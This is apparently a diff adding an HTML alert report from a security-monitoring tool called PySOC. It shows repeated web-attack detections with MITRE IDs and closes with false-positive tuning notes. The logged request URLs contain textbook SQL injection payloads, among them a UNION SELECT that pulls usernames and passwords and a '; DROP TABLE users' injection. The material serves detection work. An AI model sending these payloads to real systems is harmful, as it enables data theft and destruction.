+  &quot;matched_patterns&quot;: [
+    &quot;xss_script_tag&quot;,
+    &quot;cmd_injection_semicolon&quot;
+  ],
+  &quot;mitre_attack_ids&quot;: [
+    &quot;T1059.004&quot;,
+    &quot;T1059.007&quot;
+  ],
+  &quot;families_matched&quot;: [
+    &quot;cmd&quot;,
+    &quot;xss&quot;
+  ],
+  &quot;note&quot;: &quot;If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing.&quot;
+}</pre>
+    </div>
+    <div class="card">
+      <div class="card-header">
+        <p class="card-title"><code>WA-001</code> Web attack patterns (OWASP Top-10)</p>
+        <span class="badge medium">medium</span>
+      </div>
+      <p class="card-meta">2026-03-07T14:05:09+00:00 · source events: 1</p>
+      <p class="card-desc">Web attack pattern(s) detected: cmd_injection_semicolon</p>
+      <pre>{
+  &quot;source_ip&quot;: &quot;203.0.113.7&quot;,
+  &quot;http_method&quot;: &quot;GET&quot;,
+  &quot;http_url&quot;: &quot;/search?q=1; DROP TABLE users&quot;,
+  &quot;http_status_code&quot;: 200,
+  &quot;http_user_agent&quot;: &quot;curl/8.4.0&quot;,
+  &quot;matched_patterns&quot;: [
+    &quot;cmd_injection_semicolon&quot;
+  ],
+  &quot;mitre_attack_ids&quot;: [
+    &quot;T1059.004&quot;
+  ],
+  &quot;families_matched&quot;: [
+    &quot;cmd&quot;
+  ],
+  &quot;note&quot;: &quot;If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing.&quot;
+}</pre>
+    </div>
+    <div class="card">
+      <div class="card-header">
+        <p class="card-title"><code>WA-001</code> Web attack patterns (OWASP Top-10)</p>
+        <span class="badge medium">medium</span>
+      </div>
+      <p class="card-meta">2026-03-07T14:05:09+00:00 · source events: 1</p>
+      <p class="card-desc">Web attack pattern(s) detected: cmd_injection_semicolon</p>
+      <pre>{
+  &quot;source_ip&quot;: &quot;203.0.113.7&quot;,
+  &quot;http_method&quot;: &quot;GET&quot;,
+  &quot;http_url&quot;: &quot;/search?q=1; DROP TABLE users&quot;,
+  &quot;http_status_code&quot;: 200,
+  &quot;http_user_agent&quot;: &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36&quot;,
+  &quot;matched_patterns&quot;: [
+    &quot;cmd_injection_semicolon&quot;
+  ],
+  &quot;mitre_attack_ids&quot;: [
+    &quot;T1059.004&quot;
+  ],
+  &quot;families_matched&quot;: [
+    &quot;cmd&quot;
+  ],
+  &quot;note&quot;: &quot;If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing.&quot;
+}</pre>
+    </div>
+    <div class="card">
+      <div class="card-header">
+        <p class="card-title"><code>WA-001</code> Web attack patterns (OWASP Top-10)</p>
+        <span class="badge medium">medium</span>
+      </div>
+      <p class="card-meta">2026-03-07T14:05:06+00:00 · source events: 1</p>
+      <p class="card-desc">Web attack pattern(s) detected: sqli_comment</p>
+      <pre>{
+  &quot;source_ip&quot;: &quot;203.0.113.7&quot;,
+  &quot;http_method&quot;: &quot;GET&quot;,
+  &quot;http_url&quot;: &quot;/search?q=admin&#x27;--&quot;,
+  &quot;http_status_code&quot;: 200,
+  &quot;http_user_agent&quot;: &quot;curl/8.4.0&quot;,
+  &quot;matched_patterns&quot;: [
+    &quot;sqli_comment&quot;
+  ],
+  &quot;mitre_attack_ids&quot;: [
+    &quot;T1190&quot;
+  ],
+  &quot;families_matched&quot;: [
+    &quot;sqli&quot;
+  ],
+  &quot;note&quot;: &quot;If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing.&quot;
+}</pre>
+    </div>
+    <div class="card">
+      <div class="card-header">
+        <p class="card-title"><code>WA-001</code> Web attack patterns (OWASP Top-10)</p>
+        <span class="badge medium">medium</span>
+      </div>
+      <p class="card-meta">2026-03-07T14:05:06+00:00 · source events: 1</p>
+      <p class="card-desc">Web attack pattern(s) detected: sqli_comment</p>
+      <pre>{
+  &quot;source_ip&quot;: &quot;203.0.113.7&quot;,
+  &quot;http_method&quot;: &quot;GET&quot;,
+  &quot;http_url&quot;: &quot;/search?q=admin&#x27;--&quot;,
+  &quot;http_status_code&quot;: 200,
+  &quot;http_user_agent&quot;: &quot;curl/8.4.0&quot;,
+  &quot;matched_patterns&quot;: [
+    &quot;sqli_comment&quot;
+  ],
+  &quot;mitre_attack_ids&quot;: [
+    &quot;T1190&quot;
+  ],
+  &quot;families_matched&quot;: [
+    &quot;sqli&quot;
+  ],
+  &quot;note&quot;: &quot;If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing.&quot;
+}</pre>
+    </div>
+    <div class="card">
+      <div class="card-header">
+        <p class="card-title"><code>WA-001</code> Web attack patterns (OWASP Top-10)</p>
+        <span class="badge high">high</span>
+      </div>
+      <p class="card-meta">2026-03-07T14:05:03+00:00 · source events: 1</p>
+      <p class="card-desc">Web attack pattern(s) detected: sqli_union, sqli_comment, sqli_select_from, cmd_injection_semicolon</p>
+      <pre>{
+  &quot;source_ip&quot;: &quot;203.0.113.7&quot;,
+  &quot;http_method&quot;: &quot;GET&quot;,
+  &quot;http_url&quot;: &quot;/search?q=1 UNION SELECT NULL, username, password FROM users--&quot;,
+  &quot;http_status_code&quot;: 200,
+  &quot;http_user_agent&quot;: &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36&quot;,
+  &quot;matched_patterns&quot;: [
+    &quot;sqli_union&quot;,
+    &quot;sqli_comment&quot;,
+    &quot;sqli_select_from&quot;,
+    &quot;cmd_injection_semicolon&quot;
+  ],
+  &quot;mitre_attack_ids&quot;: [
+    &quot;T1059.004&quot;,
+    &quot;T1190&quot;
+  ],
+  &quot;families_matched&quot;: [
+    &quot;cmd&quot;,
+    &quot;sqli&quot;
+  ],
+  &quot;note&quot;: &quot;If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing.&quot;
+}</pre>
+    </div>
+    <div class="card">
+      <div class="card-header">
+        <p class="card-title"><code>WA-001</code> Web attack patterns (OWASP Top-10)</p>
+        <span class="badge high">high</span>
+      </div>
+      <p class="card-meta">2026-03-07T14:05:03+00:00 · source events: 1</p>
+      <p class="card-desc">Web attack pattern(s) detected: sqli_union, sqli_comment, sqli_select_from</p>
+      <pre>{
+  &quot;source_ip&quot;: &quot;203.0.113.7&quot;,
+  &quot;http_method&quot;: &quot;GET&quot;,
+  &quot;http_url&quot;: &quot;/search?q=1 UNION SELECT NULL, username, password FROM users--&quot;,
+  &quot;http_status_code&quot;: 200,
+  &quot;http_user_agent&quot;: &quot;python-requests/2.31.0&quot;,
+  &quot;matched_patterns&quot;: [
+    &quot;sqli_union&quot;,
+    &quot;sqli_comment&quot;,
+    &quot;sqli_select_from&quot;
+  ],
+  &quot;mitre_attack_ids&quot;: [
+    &quot;T1190&quot;
+  ],
+  &quot;families_matched&quot;: [
+    &quot;sqli&quot;
+  ],
+  &quot;note&quot;: &quot;If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing.&quot;
+}</pre>
+    </div>
+    <div class="card">
+      <div class="card-header">
+        <p class="card-title"><code>WA-001</code> Web attack patterns (OWASP Top-10)</p>
+        <span class="badge high">high</span>
+      </div>
+      <p class="card-meta">2026-03-07T14:05:00+00:00 · source events: 1</p>
+      <p class="card-desc">Web attack pattern(s) detected: sqli_or_comment</p>
+      <pre>{
+  &quot;source_ip&quot;: &quot;203.0.113.7&quot;,
+  &quot;http_method&quot;: &quot;GET&quot;,
+  &quot;http_url&quot;: &quot;/search?q=1&#x27; OR &#x27;1&#x27;=&#x27;1&quot;,
+  &quot;http_status_code&quot;: 200,
+  &quot;http_user_agent&quot;: &quot;python-requests/2.31.0&quot;,
+  &quot;matched_patterns&quot;: [
+    &quot;sqli_or_comment&quot;
+  ],
+  &quot;mitre_attack_ids&quot;: [
+    &quot;T1190&quot;
+  ],
+  &quot;families_matched&quot;: [
+    &quot;sqli&quot;
+  ],
+  &quot;note&quot;: &quot;If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing.&quot;
+}</pre>
+    </div>
+    <div class="card">
+      <div class="card-header">
+        <p class="card-title"><code>WA-001</code> Web attack patterns (OWASP Top-10)</p>
+        <span class="badge high">high</span>
+      </div>
+      <p class="card-meta">2026-03-07T14:05:00+00:00 · source events: 1</p>
+      <p class="card-desc">Web attack pattern(s) detected: sqli_or_comment</p>
+      <pre>{
+  &quot;source_ip&quot;: &quot;203.0.113.7&quot;,
+  &quot;http_method&quot;: &quot;GET&quot;,
+  &quot;http_url&quot;: &quot;/search?q=1&#x27; OR &#x27;1&#x27;=&#x27;1&quot;,
+  &quot;http_status_code&quot;: 200,
+  &quot;http_user_agent&quot;: &quot;curl/8.4.0&quot;,
+  &quot;matched_patterns&quot;: [
+    &quot;sqli_or_comment&quot;
+  ],
+  &quot;mitre_attack_ids&quot;: [
+    &quot;T1190&quot;
+  ],
+  &quot;families_matched&quot;: [
+    &quot;sqli&quot;
+  ],
+  &quot;note&quot;: &quot;If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing.&quot;
+}</pre>
+    </div>
+
+  <div class="footer">
+    <h2>False-Positive Handling Notes</h2>
+    <ul><li>BF-001: load balancer / health-check probes; scripts using expired passwords.</li><li>SP-001: legitimate admin use of encoded PowerShell; signed vendor installers.</li><li>WA-001: security scanners; aggressive WAF probes; legacy app false negatives.</li><li>IT-001: corporate VPN egressing through multiple POPs; mobile network hand-off.</li></ul>
+    <p>See <code>docs/FALSE_POSITIVES.md</code> for full tuning guidance.</p>
+    <p>PySOC 1.0.0 — MIT License</p>
+  </div>
+</body>
+</html>
